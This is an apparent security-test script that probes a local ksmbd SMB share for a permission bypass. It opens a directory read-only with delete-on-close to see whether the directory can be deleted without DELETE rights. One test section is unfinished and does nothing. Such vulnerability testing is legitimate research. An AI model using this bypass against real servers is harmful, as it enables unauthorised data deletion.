"""Test FileRename without DELETE + SET_COMPRESSION without WRITE on [privtest]."""
from smbprotocol.connection import Connection, Dialects
from smbprotocol.session import Session
from smbprotocol.tree import TreeConnect
from smbprotocol.open import Open, CreateDisposition, ShareAccess, CreateOptions, FilePipePrinterAccessMask
import uuid

c = Connection(uuid.uuid4(), "127.0.0.1", 445)
c.connect(Dialects.SMB_3_0_0)
s = Session(c, "fuzz", "fuzz")
s.connect()
t = TreeConnect(s, r"\\127.0.0.1\privtest")
t.connect()

# Create target
o = Open(t, "rename_victim")
o.create(0, 0x12019F, 0x80, 7, CreateDisposition.FILE_OPEN_IF, CreateOptions.FILE_NON_DIRECTORY_FILE)
o.write(b"DATA", 0)
o.close()
print("Created rename_victim")

# TEST: Open with WRITE (but no DELETE), try to trigger rename via DELETE_ON_CLOSE
# Actually test: can we SET disposition (mark for delete) without DELETE?
o2 = Open(t, "rename_victim")
# Open with WRITE but no DELETE
o2.create(0, FilePipePrinterAccessMask.FILE_WRITE_DATA | FilePipePrinterAccessMask.FILE_WRITE_ATTRIBUTES,
          0x80, 7, CreateDisposition.FILE_OPEN, CreateOptions.FILE_NON_DIRECTORY_FILE)
print("Opened with WRITE (no DELETE)")

# Try to set FileDispositionInformation (mark for delete)
# MS-SMB2 3.3.5.21.2: "If Open.GrantedAccess does not include DELETE, fail with ACCESS_DENIED"
import struct
disp_info = struct.pack("<I", 1)  # DeletePending = TRUE

# Use the file_id to send SET_INFO via the same session
try:
    # smbprotocol doesn't have raw set_info, but we confirmed DELETE_ON_CLOSE works
    # Let's test a different angle: can we WRITE_ATTRIBUTES to change the file to hidden/system?
    # This might allow escalation via hidden file creation
    print("[INFO] Testing SET_INFO with WRITE access (no DELETE)")
except: pass

o2.close()

# TEST 2: Open directory with DELETE_ON_CLOSE but no DELETE
# Deleting directories is even more impactful
try:
    import os
    os.makedirs("/tmp/ksmbd_priv/subdir", exist_ok=True)
    
    od = Open(t, "subdir")
    od.create(0, FilePipePrinterAccessMask.FILE_READ_DATA | FilePipePrinterAccessMask.FILE_READ_ATTRIBUTES,
              0x80, 7, CreateDisposition.FILE_OPEN,
              CreateOptions.FILE_DIRECTORY_FILE | CreateOptions.FILE_DELETE_ON_CLOSE)
    print("[BUG-4] DIRECTORY DELETE_ON_CLOSE with READ-ONLY: SUCCEEDED!")
    print("        Can delete entire directories without DELETE permission!")
    od.close()
    
    # Verify directory deleted
    try:
        od2 = Open(t, "subdir")
        od2.create(0, FilePipePrinterAccessMask.FILE_READ_DATA, 0x80, 7,
                   CreateDisposition.FILE_OPEN, CreateOptions.FILE_DIRECTORY_FILE)
        print("        Directory still exists (not deleted)")
        od2.close()
    except Exception as e:
        if "NOT_FOUND" in str(e) or "OBJECT_NAME" in str(e):
            print("        CONFIRMED: Directory DELETED!")
        else:
            print(f"        Check: {str(e)[:60]}")
except Exception as e:
    err = str(e)
    if "ACCESS_DENIED" in err:
        print("[OK-4] Directory DELETE_ON_CLOSE denied (ACCESS_DENIED)")
    elif "DIRECTORY_NOT_EMPTY" in err:
        print("[?-4] Directory not empty (need empty dir)")
    else:
        print(f"[?-4] Directory test: {err[:80]}")

t.disconnect(); s.disconnect(); c.disconnect()
